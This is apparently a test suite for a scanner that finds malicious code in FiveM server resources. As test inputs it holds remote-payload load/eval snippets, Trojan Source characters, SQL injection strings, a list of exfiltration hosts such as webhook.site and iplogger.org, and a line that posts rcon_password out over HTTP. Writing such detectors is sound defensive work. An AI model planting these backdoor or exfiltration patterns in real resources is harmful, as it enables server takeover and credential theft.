import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { formatSarif } from '../src/report/machine.ts';
import { formatText, sanitize } from '../src/report/text.ts';
import { analyze, scan } from '../src/scanner.ts';
import { createSource } from '../src/source.ts';
import { findings, only } from './helpers.ts';

describe('FS001 bypasses', () => {
  it('sees through _G, _ENV and global receivers', () => {
    assert.equal(only('_G.load(payload)()', 'FS001').length, 1);
    assert.equal(only('_ENV.loadstring(payload)()', 'FS001').length, 1);
    assert.equal(only('window.eval(code); globalThis.eval(more)', 'FS001', 'js').length, 2);
    assert.deepEqual(only('obj.eval(x); json.load(y)', 'FS001', 'js'), []);
  });

  it('flags loaders used as values', () => {
    assert.equal(only('local run = load\nrun(payload)()', 'FS001')[0]?.severity, 'high');
    assert.equal(only('local ok, fn = pcall(load, payload)', 'FS001')[0]?.severity, 'high');
    assert.equal(only('const run = eval; run(x)', 'FS001', 'js')[0]?.severity, 'high');
    assert.equal(only('(0, eval)(x)', 'FS001', 'js').length, 1);
  });

  it('does not confuse table keys and comparisons with aliases', () => {
    assert.deepEqual(only('local t = { load = function() end, save = 1 }\nif x == loadValue then end', 'FS001'), []);
    assert.deepEqual(only('const o = { eval: 1 }', 'FS001', 'js'), []);
  });

  it('flags parenthesis-less calls and string timers', () => {
    assert.equal(only('load "return os.exit()" ()', 'FS001').length, 1);
    assert.equal(only('load[[ print(1) ]]()', 'FS001').length, 1);
    assert.equal(only('setTimeout("steal()", 100)', 'FS001', 'js').length, 1);
    assert.deepEqual(only('setTimeout(() => tick(), 100)', 'FS001', 'js'), []);
  });
});

describe('FS002 named callbacks', () => {
  it('follows a named callback to its body', () => {
    const code = 'local function onBody(err, body)\n  load(body)()\nend\nPerformHttpRequest(url, onBody)';
    assert.equal(only(code, 'FS002').length, 1);
  });

  it('ignores named callbacks that do not execute', () => {
    const code = 'local function onBody(err, body)\n  print(body)\nend\nPerformHttpRequest(url, onBody)';
    assert.deepEqual(only(code, 'FS002'), []);
  });
});

describe('FS003 precision', () => {
  it('ignores escaped accented text', () => {
    const text = 'Vous avez reçu un véhicule réparé et lavé'.split('').map((c) => (c.charCodeAt(0) > 127 ? [...Buffer.from(c)].map((b) => `\\${b}`).join('') : c)).join('');
    assert.deepEqual(only(`Notify("${text}")`, 'FS003'), []);
  });

  it('detects Trojan Source and invisible characters', () => {
    const [bidi] = only('local isAdmin = false \u202E end if isAdmin then', 'FS003');
    assert.equal(bidi?.severity, 'critical');
    assert.equal(only('local s = "a\u200Bb"', 'FS003')[0]?.severity, 'low');
  });

  it('ignores long data lines but flags packed code', () => {
    const data = `Config.Points = { ${Array.from({ length: 300 }, (_, i) => `vector3(${i}.0, ${i}.5, 30.0)`).join(', ')} }`;
    assert.deepEqual(only(data, 'FS003'), []);
    const packed = Array.from({ length: 200 }, (_, i) => `local a${i} = function() if x then return ${i} end end`).join(' ');
    assert.equal(only(packed, 'FS003').length, 1);
  });
});

describe('FS005 query variables', () => {
  it('flags queries assembled in a variable first', () => {
    const code = "local query = 'SELECT * FROM users WHERE name = \"' .. name .. '\"'\nMySQL.query(query, {})";
    assert.match(only(code, 'FS005')[0]?.message ?? '', /via "query"/);
    assert.equal(only('const sql = `DELETE FROM bans WHERE id = ${id}`;\nawait MySQL.query(sql);', 'FS005', 'js').length, 1);
  });

  it('accepts parameterized queries stored in variables', () => {
    assert.deepEqual(only("local query = 'SELECT * FROM users WHERE name = ?'\nMySQL.query(query, { name })", 'FS005'), []);
  });
});

describe('FS006 taint and guards', () => {
  it('watches removal sinks', () => {
    assert.equal(only("RegisterNetEvent('pay', function(n)\n  xPlayer.removeMoney(n)\nend)", 'FS006').length, 1);
  });

  it('follows simple aliases', () => {
    const code = "RegisterNetEvent('buy', function(data)\n  local amount = data.count\n  local qty = amount\n  xPlayer.addInventoryItem('bread', qty)\nend)";
    assert.match(only(code, 'FS006')[0]?.message ?? '', /"qty"/);
  });

  it('only accepts guards that check the flowing value', () => {
    const unrelated = "RegisterNetEvent('pay', function(n)\n  if not xPlayer then return end\n  xPlayer.addMoney(n)\nend)";
    assert.equal(only(unrelated, 'FS006')[0]?.severity, 'high');
    const related = "RegisterNetEvent('pay', function(n)\n  n = math.floor(tonumber(n) or 0)\n  if n < 1 or n > 100 then return end\n  xPlayer.addMoney(n)\nend)";
    assert.equal(only(related, 'FS006')[0]?.severity, 'medium');
  });
});

describe('FS007 calibration', () => {
  it('rates file access below shell access', () => {
    assert.equal(only("local f = io.open('log.txt', 'a')", 'FS007')[0]?.severity, 'medium');
    assert.equal(only("process.binding('spawn_sync')", 'FS007', 'js')[0]?.severity, 'critical');
  });
});

describe('FS008 exfiltration hosts', () => {
  it('flags capture services and IP loggers', () => {
    const found = only("PerformHttpRequest('https://webhook.site/abc', cb)\nlocal l = 'https://iplogger.org/x'", 'FS008');
    assert.deepEqual(found.map((f) => f.severity), ['high', 'high']);
  });

  it('reads URLs in HTML attributes', () => {
    const html = '<html><script src="https://pastebin.com/raw/x"></script></html>';
    assert.equal(only(html, 'FS008', 'js', 'shared', 'res/html/index.html').length, 1);
  });
});

describe('FS010 unrestricted commands', () => {
  const open = "RegisterCommand('givecash', function(source, args)\n  xPlayer.addMoney(tonumber(args[1]))\nend, false)";

  it('flags commands that give value to anyone', () => {
    assert.equal(only(open, 'FS010')[0]?.severity, 'high');
  });

  it('accepts restricted or permission-checked commands', () => {
    assert.deepEqual(only(open.replace('end, false)', 'end, true)'), 'FS010'), []);
    const checked = open.replace('  xPlayer', "  if not IsPlayerAceAllowed(source, 'admin') then return end\n  xPlayer");
    assert.deepEqual(only(checked, 'FS010'), []);
  });
});

describe('FS011 sensitive convars', () => {
  it('escalates when combined with network access', () => {
    assert.equal(only("local p = GetConvar('rcon_password', '')\nPerformHttpRequest(u, cb, 'POST', p)", 'FS011')[0]?.severity, 'critical');
    assert.equal(only("SetConvar('rcon_password', 'x')", 'FS011')[0]?.severity, 'critical');
  });

  it('allows database drivers to read their connection string', () => {
    const code = "local c = GetConvar('mysql_connection_string', '')";
    const inResource = (resource: string) =>
      analyze(createSource({ absolutePath: 'x.lua', path: 'x.lua', resource, language: 'lua', side: 'server', text: code })).filter((f) => f.ruleId === 'FS011');
    assert.equal(inResource('oxmysql').length, 0);
    assert.equal(inResource('shady_shop').length, 1);
  });
});

describe('snippet safety', () => {
  it('redacts secrets in snippets of other findings on the same line', () => {
    const hook = `https://discord.com/api/webhooks/123456789012345678/${'Zx9q'.repeat(17)}`;
    const all = findings(`PerformHttpRequest("${hook}", function(e, b) load(b)() end)`);
    assert.ok(all.length >= 2);
    assert.ok(all.every((f) => !f.snippet.includes('Zx9qZx9qZx9q')));
  });

  it('neutralises terminal control sequences', () => {
    assert.equal(sanitize('a\u001b[31mb\u202Ec'), 'a\\u001B[31mb\\u202Ec');
  });
});

describe('html', () => {
  it('analyzes script blocks and ignores markup text', () => {
    const html = "<p>don't eval(this) text</p><script>const r = await fetch(u); eval(await r.text());</script>";
    const found = findings(html, 'js', 'client', 'res/html/index.html');
    assert.deepEqual([...new Set(found.map((f) => f.ruleId))].sort(), ['FS001', 'FS002']);
    assert.ok(found.every((f) => f.line === 1 && f.column > 30));
  });
});

describe('scanner hardening', () => {
  let root = '';

  before(async () => {
    root = await mkdtemp(join(tmpdir(), 'fivem-sentinel-hard-'));
    await mkdir(join(root, 'res', 'server'), { recursive: true });
    await mkdir(join(root, 'res', 'Stream'), { recursive: true });
    await writeFile(join(root, 'res', 'fxmanifest.lua'), "fx_version 'cerulean'\nserver_script 'server/*.lua'");
    await writeFile(join(root, 'res', 'server', 'main.lua'), 'load(x)');
    await writeFile(join(root, 'res', 'Stream', 'x.lua'), 'load(y)');
    await writeFile(join(root, 'res', 'big.lua'), `-- ${'a'.repeat(4096)}`);
    await writeFile(join(root, 'res', 'bin.lua'), Buffer.from([0x6c, 0, 0x61]));
  });

  after(async () => {
    await rm(root, { recursive: true, force: true });
  });

  it('reports skipped files with a reason', async () => {
    const result = await scan([root], { maxFileSize: 1024 });
    const reasons = Object.fromEntries(result.skipped.map((s) => [s.path.split('/').pop(), s.reason]));
    assert.equal(reasons['big.lua'], 'too-large');
    assert.equal(reasons['bin.lua'], 'binary');
    assert.match(formatText(result, { color: false, verbose: true }), /too-large/);
  });

  it('skips stream folders regardless of case and dedupes overlapping roots', async () => {
    const result = await scan([root, join(root, 'res')]);
    assert.equal(result.findings.filter((f) => f.ruleId === 'FS001').length, 1);
  });

  it('supports directory ignore patterns with a trailing slash', async () => {
    const result = await scan([root], { ignore: ['server/'] });
    assert.equal(result.findings.length, 0);
  });

  it('fails clearly on missing paths', async () => {
    await assert.rejects(scan([join(root, 'nope')]), /Path not found/);
  });

  it('writes SARIF locations relative to the working directory', async () => {
    const result = await scan([join(root, 'res')]);
    const uri: string = JSON.parse(formatSarif(result)).runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri;
    assert.equal(decodeURI(uri), relative(process.cwd(), join(root, 'res', 'server', 'main.lua')).split('\\').join('/'));
  });
});

describe('idioms', () => {
  it('accepts caching a loader under its own name', () => {
    assert.deepEqual(only('local load = load\nlocal loadstring = _G.loadstring', 'FS001'), []);
  });

  it('rates local convar comparisons as medium', () => {
    assert.equal(only("if pass ~= GetConvar('rcon_password', '') then return end", 'FS011')[0]?.severity, 'medium');
  });
});
